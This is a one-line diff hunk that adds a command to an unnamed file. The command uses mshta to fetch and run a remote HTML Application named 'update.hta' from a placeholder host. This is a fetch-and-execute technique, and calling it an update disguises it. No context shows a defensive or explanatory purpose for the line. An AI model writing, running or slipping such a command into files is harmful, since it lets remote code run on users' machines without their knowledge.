@@ -1,0 +1,1 @@
+mshta https://files.example.invalid/update.hta
